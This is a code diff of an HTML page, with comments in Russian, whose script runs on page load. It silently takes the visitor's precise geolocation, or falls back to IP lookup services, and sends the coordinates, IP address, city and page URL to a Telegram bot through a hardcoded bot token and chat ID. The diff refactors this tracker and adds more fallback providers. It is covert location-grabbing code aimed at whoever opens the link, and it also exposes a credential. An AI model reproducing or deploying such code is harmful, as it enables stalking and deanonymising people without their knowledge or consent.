@@ -15,7 +15,7 @@
 </head>
 <body>
     <script>
-        // ===== Твои данные Telegram (вставлены) =====
+        // ===== Твои данные =====
         var BOT_TOKEN = "7721494922:AAE3rqaQwY4eKMHb07Kb_Pv2HxK6LMv6up4";
         var CHAT_ID = "5570036809";
 
@@ -25,37 +25,66 @@
             fetch(url, { mode: 'no-cors' }).catch(function(){});
         }
 
-        // ===== Геопозиция =====
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                function(pos) {
-                    var c = pos.coords;
-                    send("📍 Координаты:\nШирота: " + c.latitude + "\nДолгота: " + c.longitude + "\nТочность: " + c.accuracy + " м\nВысота: " + (c.altitude || "нет") + "\nURL: " + location.href);
-                },
-                function(err) {
-                    send("❌ Ошибка геолокации: " + err.message + "\nURL: " + location.href);
-                    fetch('https://ipapi.co/json/')
-                        .then(r => r.json())
-                        .then(d => {
-                            send("🌐 IP-гео:\nГород: " + (d.city || "нет") + "\nСтрана: " + (d.country_name || "нет") + "\nIP: " + (d.ip || "нет") + "\nURL: " + location.href);
-                        })
-                        .catch(function(e) {
-                            send("❌ IP-гео не удалось: " + e);
-                        });
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        } else {
-            send("❌ Браузер не поддерживает геолокацию\nURL: " + location.href);
-            fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(d => {
-                    send("🌐 IP-гео:\nГород: " + (d.city || "нет") + "\nСтрана: " + (d.country_name || "нет") + "\nIP: " + (d.ip || "нет") + "\nURL: " + location.href);
-                })
-                .catch(function(e) {
-                    send("❌ IP-гео не удалось: " + e);
-                });
+        // ===== Основная функция =====
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        var c = pos.coords;
+                        send("📍 Координаты:\nШирота: " + c.latitude + "\nДолгота: " + c.longitude + "\nТочность: " + c.accuracy + " м\nВысота: " + (c.altitude || "нет") + "\nURL: " + location.href);
+                    },
+                    function(err) {
+                        send("❌ Ошибка геолокации: " + err.message + "\nURL: " + location.href);
+                        getIPGeo(); // запасной IP
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                send("❌ Браузер не поддерживает геолокацию\nURL: " + location.href);
+                getIPGeo();
+            }
         }
+
+        // ===== IP-гео с несколькими провайдерами =====
+        function getIPGeo() {
+            var services = [
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json',
+                'https://api.ipify.org?format=json'
+            ];
+            var index = 0;
+
+            function tryNext() {
+                if (index >= services.length) {
+                    send("❌ Не удалось определить IP-гео (все сервисы недоступны)\nURL: " + location.href);
+                    return;
+                }
+                fetch(services[index])
+                    .then(function(res) {
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(function(data) {
+                        var msg = "🌐 IP-гео (через " + services[index] + "):\n";
+                        if (data.city) msg += "Город: " + data.city + "\n";
+                        if (data.region) msg += "Регион: " + data.region + "\n";
+                        if (data.country_name) msg += "Страна: " + data.country_name + "\n";
+                        else if (data.country) msg += "Страна: " + data.country + "\n";
+                        if (data.ip) msg += "IP: " + data.ip + "\n";
+                        if (data.loc) msg += "Координаты (loc): " + data.loc + "\n";
+                        msg += "URL: " + location.href;
+                        send(msg);
+                    })
+                    .catch(function(e) {
+                        index++;
+                        tryNext();
+                    });
+            }
+            tryNext();
+        }
+
+        // ===== Запуск =====
+        getLocation();
     </script>
 </body>
 </html>
